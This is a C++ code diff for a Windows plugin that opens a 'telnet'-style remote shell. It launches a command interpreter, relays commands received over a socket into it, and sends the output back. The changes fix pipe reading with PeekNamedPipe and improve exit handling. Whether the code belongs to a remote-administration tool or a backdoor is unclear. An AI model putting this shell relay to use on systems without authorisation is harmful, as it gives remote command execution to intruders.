@@ -7,7 +7,7 @@ public:
       bool runFun(PluginNamespace::PluginInfo &info) override
       {
             auto pluginInfo = std::static_pointer_cast<PluginInfoStruct>(info.cus->data[0]);
-            return open_telnet(*info.mainConnectSocket) == SUCCESS_OPERAT;
+            return (open_telnet(*info.mainConnectSocket) == SUCCESS_OPERAT);
       }
       connectClient()
       {
@@ -25,7 +25,7 @@ private:
             HANDLE outputRead, outputWrite;
             HANDLE inputRead, inputWrite;
             SECURITY_ATTRIBUTES sa = {0};
-            char szCMDPath[255];
+            char szCMDPath[255] = {0};
             DWORD dwBytesRead = 0;
             DWORD dwBytesWrite = 0;
 
@@ -55,16 +55,22 @@ private:
                   std::string buf;
                   buf = readPipeALLData(outputRead).first;
                   send(socket, buf);
-                  while (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 1))
+                  while (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
                   {
                         recv(socket, buf);
                         buf += "\r\n";
                         WriteFile(inputWrite, buf.c_str(), strlen(buf.c_str()), &dwBytesWrite, NULL);
-                        buf = readPipeALLData(outputRead).first;
-                        send(socket, buf);
+                        if (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
+                        {
+                              buf = readPipeALLData(outputRead).first;
+                              send(socket, buf);
+                        }
+                        else
+                        {
+                              send(socket, "\r\n[exit]\r\n");
+                              break;
+                        }
                   }
-                  recv(socket, buf);
-                  send(socket, "\r\n[exit]\r\n");
             }
             else
             {
@@ -81,29 +87,33 @@ private:
       std::pair<std::string, DWORD> readPipeALLData(HANDLE outputRead, int timeout_ms = 100)
       {
             std::string res;
-            char cbuf[512] = {0};
-            DWORD dwBytesRead = 0;
-            DWORD mode = PIPE_NOWAIT;
-            SetNamedPipeHandleState(outputRead, &mode, NULL, NULL);
+            char cbuf[2048] = {0};
+            DWORD dwBytesRead = 0, bytesAvailable = 0;
             do
             {
-                  ReadFile(outputRead, cbuf, sizeof(cbuf), &dwBytesRead, NULL);
-                  DWORD error = GetLastError();
-                  SetLastError(ERROR_SUCCESS);
-                  if (error == ERROR_NO_DATA)
+                  if (PeekNamedPipe(outputRead, NULL, 0, NULL, &bytesAvailable, NULL))
                   {
-                        if (timeout_ms - 10 <= 0)
-                              Sleep(timeout_ms);
-                        else
-                              Sleep(10);
-                        timeout_ms -= 10;
-                        continue;
+                        if (bytesAvailable > 0)
+                        {
+                              // 有数据可读
+                              ReadFile(outputRead, cbuf, sizeof(cbuf) - 1, &dwBytesRead, NULL);
+                              res += cbuf;
+                              if (dwBytesRead == 0)
+                                    break;
+                        }
                   }
-                  res += cbuf;
-                  memset(cbuf, 0, sizeof(cbuf));
-                  if (dwBytesRead == 0)
+                  if (timeout_ms <= 0)
                         break;
+                  else if (timeout_ms - 10 <= 0)
+                        Sleep(timeout_ms);
+                  else
+                        Sleep(10);
+                  timeout_ms -= 10;
+                  memset(cbuf, 0, sizeof(cbuf));
             } while (timeout_ms > 0);
+
+            memset(cbuf, 0, sizeof(cbuf));
+
             return make_pair(res, dwBytesRead);
       }
 };
